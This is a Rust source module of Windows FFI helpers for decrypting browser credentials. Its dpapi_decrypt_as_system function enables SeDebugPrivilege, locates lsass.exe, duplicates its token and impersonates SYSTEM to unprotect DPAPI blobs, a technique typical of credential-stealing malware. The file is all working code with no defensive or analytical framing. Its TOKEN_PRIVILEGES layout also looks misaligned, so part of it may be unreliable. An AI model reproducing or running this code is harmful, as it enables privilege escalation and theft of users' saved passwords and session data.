//! Windows DPAPI / process FFI helpers for browser credential decryption.

// ── DPAPI ──────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub(super) fn dpapi_unprotect(data: &[u8]) -> Option<Vec<u8>> {
    let blob_in = DATA_BLOB {
        cbData: data.len() as u32,
        pbData: data.as_ptr() as *mut u8,
    };
    let mut blob_out = DATA_BLOB { cbData: 0, pbData: std::ptr::null_mut() };
    unsafe {
        let ok = CryptUnprotectData(
            &blob_in, std::ptr::null(), std::ptr::null(),
            std::ptr::null(), std::ptr::null(), 0, &mut blob_out,
        );
        if ok == 0 || blob_out.pbData.is_null() {
            return None;
        }
        let result = std::slice::from_raw_parts(blob_out.pbData, blob_out.cbData as usize).to_vec();
        LocalFree(blob_out.pbData);
        Some(result)
    }
}

#[cfg(target_os = "windows")]
pub(super) fn dpapi_decrypt_as_system(data: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let procs = find_lsass_pid()?;

        enable_debug_privilege()?;

        let h_proc = OpenProcess(0x1000, 0, procs); // PROCESS_QUERY_LIMITED_INFORMATION
        if h_proc == 0 {
            return None;
        }

        let result = (|| {
            let mut h_token: isize = 0;
            if OpenProcessToken(h_proc, 0x0002 | 0x0008, &mut h_token) == 0 {
                return None;
            } // TOKEN_DUPLICATE | TOKEN_QUERY

            let mut lsass_token: isize = 0;
            if DuplicateTokenEx(h_token, 0x000F01FF, std::ptr::null(), 2, 1, &mut lsass_token) == 0 {
                CloseHandle(h_token);
                return None;
            }
            CloseHandle(h_token);

            if ImpersonateLoggedOnUser(lsass_token) == 0 {
                CloseHandle(lsass_token);
                return None;
            }

            let out = dpapi_unprotect(data);
            RevertToSelf();
            CloseHandle(lsass_token);
            out
        })();

        CloseHandle(h_proc);
        result
    }
}

#[cfg(target_os = "windows")]
unsafe fn find_lsass_pid() -> Option<u32> {
    // Use CreateToolhelp32Snapshot to enumerate processes
    let snapshot = CreateToolhelp32Snapshot(0x00000002, 0); // TH32CS_SNAPPROCESS
    if snapshot == -1 {
        return None;
    }

    let mut pe = PROCESSENTRY32W {
        dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
        ..std::mem::zeroed()
    };

    if Process32FirstW(snapshot, &mut pe) != 0 {
        loop {
            let name = String::from_utf16_lossy(
                &pe.szExeFile[..pe.szExeFile.iter().position(|&c| c == 0).unwrap_or(pe.szExeFile.len())]
            );
            if name.eq_ignore_ascii_case("lsass.exe") {
                CloseHandle(snapshot);
                return Some(pe.th32ProcessID);
            }
            if Process32NextW(snapshot, &mut pe) == 0 {
                break;
            }
        }
    }
    CloseHandle(snapshot);
    None
}

#[cfg(target_os = "windows")]
unsafe fn enable_debug_privilege() -> Option<()> {
    let mut h_token: isize = 0;
    if OpenProcessToken(GetCurrentProcess(), 0x0020 | 0x0008, &mut h_token) == 0 {
        return None;
    }

    let mut luid: i64 = 0;
    let name: Vec<u16> = "SeDebugPrivilege\0".encode_utf16().collect();
    if LookupPrivilegeValueW(std::ptr::null(), name.as_ptr(), &mut luid) == 0 {
        CloseHandle(h_token);
        return None;
    }

    let tp = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Luid: luid,
        Attributes: 0x00000002, // SE_PRIVILEGE_ENABLED
    };

    AdjustTokenPrivileges(h_token, 0, &tp, 0, std::ptr::null_mut(), std::ptr::null_mut());
    CloseHandle(h_token);
    Some(())
}

// ── Windows FFI ────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
#[repr(C)]
struct DATA_BLOB {
    cbData: u32,
    pbData: *mut u8,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct TOKEN_PRIVILEGES {
    PrivilegeCount: u32,
    Luid: i64,
    Attributes: u32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct PROCESSENTRY32W {
    dwSize: u32,
    cntUsage: u32,
    th32ProcessID: u32,
    th32DefaultHeapID: usize,
    th32ModuleID: u32,
    cntThreads: u32,
    th32ParentProcessID: u32,
    pcPriClassBase: i32,
    dwFlags: u32,
    szExeFile: [u16; 260],
}

#[cfg(target_os = "windows")]
extern "system" {
    // crypt32
    fn CryptUnprotectData(
        pDataIn: *const DATA_BLOB,
        ppszDataDescr: *const u16,
        pOptionalEntropy: *const DATA_BLOB,
        pvReserved: *const std::ffi::c_void,
        pPromptStruct: *const std::ffi::c_void,
        dwFlags: u32,
        pDataOut: *mut DATA_BLOB,
    ) -> i32;

    // kernel32
    fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: i32, dwProcessId: u32) -> isize;
    fn CloseHandle(hObject: isize) -> i32;
    fn LocalFree(hMem: *mut u8) -> isize;
    fn GetCurrentProcess() -> isize;
    fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> isize;
    fn Process32FirstW(hSnapshot: isize, lppe: *mut PROCESSENTRY32W) -> i32;
    fn Process32NextW(hSnapshot: isize, lppe: *mut PROCESSENTRY32W) -> i32;

    // advapi32
    fn OpenProcessToken(ProcessHandle: isize, DesiredAccess: u32, TokenHandle: *mut isize) -> i32;
    fn DuplicateTokenEx(
        hExistingToken: isize,
        dwDesiredAccess: u32,
        lpTokenAttributes: *const std::ffi::c_void,
        ImpersonationLevel: i32,
        TokenType: i32,
        phNewToken: *mut isize,
    ) -> i32;
    fn ImpersonateLoggedOnUser(hToken: isize) -> i32;
    fn RevertToSelf() -> i32;
    fn LookupPrivilegeValueW(lpSystemName: *const u16, lpName: *const u16, lpLuid: *mut i64) -> i32;
    fn AdjustTokenPrivileges(
        TokenHandle: isize,
        DisableAllPrivileges: i32,
        NewState: *const TOKEN_PRIVILEGES,
        BufferLength: u32,
        PreviousState: *mut TOKEN_PRIVILEGES,
        ReturnLength: *mut u32,
    ) -> i32;
}
